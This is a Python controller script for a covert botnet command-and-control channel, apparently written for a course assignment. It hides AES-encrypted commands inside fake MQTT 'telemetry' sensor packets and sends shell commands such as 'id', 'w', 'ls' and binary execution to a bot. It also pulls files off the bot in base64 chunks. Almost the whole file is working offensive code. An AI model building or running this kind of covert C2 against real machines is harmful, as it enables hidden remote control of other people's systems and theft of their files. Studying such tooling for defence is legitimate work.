import base64
import json
import time
import paho.mqtt.client as mqtt
from consts import *
from utils import encrypt_payload_AES_then_b64, decrypt_payload, log
import threading
response_event = threading.Event()
# global buffer for reassembling broken up chunks
chunk_buffer = {}
# This runs whenever the bot sends a response back to the 'sensors' topic

DEBUG_PRINT = True
TIMEOUT_DURATION = 90  # seconds

def on_message(client, userdata, msg):
    try:
        packet = json.loads(msg.payload.decode())
        if packet.get("s_id") != BOT_ID:
            return

        encrypted_payload = packet.get(DATA_KEY)
        raw_res = decrypt_payload(encrypted_payload)

        if (packet.get("type") == "telemetry_status"):
            if(DEBUG_PRINT):
                log(f"...bot heartbeat triggered...")
                # no response event
            return
        full_msg = get_msg_from_chunks(raw_res)
        # If handle_fragment returns a string,
        # then reconstruction is complete
        if full_msg:
            if "FILE_B64:" in full_msg:
                # file transfer logic
                save_file_from_message(full_msg)
            else:
                # regular message
                log(f"[RESPONSE]: {full_msg}")
            # unlock main thread
            response_event.set()

    except:
        pass


def save_file_from_message(raw_res):
    try:
        _, filename, b64data = raw_res.split(":", 2)
        with open(f"copied_{filename}", "wb") as f:
            f.write(base64.b64decode(b64data))
        log(f"[SYSTEM]: Successfully copied file: {filename}, saved as copied_{filename}")
    except Exception as e:
        log(f"[SYSTEM]: Error decoding binary file: {e}")


def create_controller_packet(encrypted_b64_payload):
    packet = {
        "s_id": CONTROLLER_ID,
        "type": "telemetry_poll",
        DATA_KEY: encrypted_b64_payload
    }
    return packet


def get_msg_from_chunks(raw_res):
    try:
        # Split: CHK : current : total : data
        parts = raw_res.split(":", 3)
        if len(parts) < 4: return None

        _, current, total, data = parts
        current, total = int(current), int(total)

        # Store fragment
        if "data" not in chunk_buffer:
            chunk_buffer["data"] = [None] * total # none to track missing chunks

        chunk_buffer["data"][current-1] = data

        # Print progress
        log(f"[*] Received chunk {current}/{total}...")


        # See if complete
        if all(c is not None for c in chunk_buffer["data"]):
            full_msg = "".join(chunk_buffer["data"])
            chunk_buffer.clear()
            print()
            return full_msg
        return None
    except:
        log("[SYSTEM]: Error handling fragment.")
        return None


def timeout_message():
    if not response_event.wait(timeout=TIMEOUT_DURATION):
        log(f"[TIMEOUT]: No response for {test}")


def debug_send_print():
    print("----")
    print(f"[DEBUG]: showcase of the hidden packet being sent:")
    print(json.dumps(packet, indent=4))
    print("----")


if __name__ == '__main__':
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.connect(BROKER, PORT)
    client.subscribe(TOPIC)
    # loop_start() required over loop_forever() to allow sending commands
    client.loop_start()
    log("Controller is ready. Type a command (e.g., 'id', 'w', 'ping'):")
    try:
        while True:
            cmd = input("Waiting for command: ")
            if cmd.lower() == "exit":
                break

            if cmd == "testall":
                log("Testing all Requirements...")
                test_suite = [
                    CMD_ANNOUNCE_BOT, # botStatus, requirement 5.1
                    CMD_WHO_IS_LOGGED_IN, # w, requirement 5.2
                    CMD_LIST_FILES, # ls, requirement 5.3
                    CMD_ID_HOST, # id, requirement 5.4
                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " fileToCopy.txt",  # requirement 5.5
                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " chunking_test.txt",  # check if chunking works for large files
                    CMD_CHMOD_TEST_BINARY, # requirement 5.6
                    CMD_RUN_TEST_BINARY # requirement 5.6
                ]

                for test in test_suite:
                    log(f"[*] Testing: {test}")
                    response_event.clear()
                    encrypted_b64_payload = encrypt_payload_AES_then_b64(test)
                    packet = create_controller_packet(encrypted_b64_payload)
                    client.publish(TOPIC, json.dumps(packet))
                    if(DEBUG_PRINT):
                        debug_send_print()
                    timeout_message()
                continue

            encrypted_b64_payload = encrypt_payload_AES_then_b64(cmd)
            # hide data in base64
            packet = create_controller_packet(encrypted_b64_payload)


            if(DEBUG_PRINT):
                debug_send_print()

            response_event.clear()
            # send the data hidden within a json packet
            client.publish(TOPIC, json.dumps(packet))
            timeout_message()
    except KeyboardInterrupt:
        pass

    client.loop_stop()
    client.disconnect()

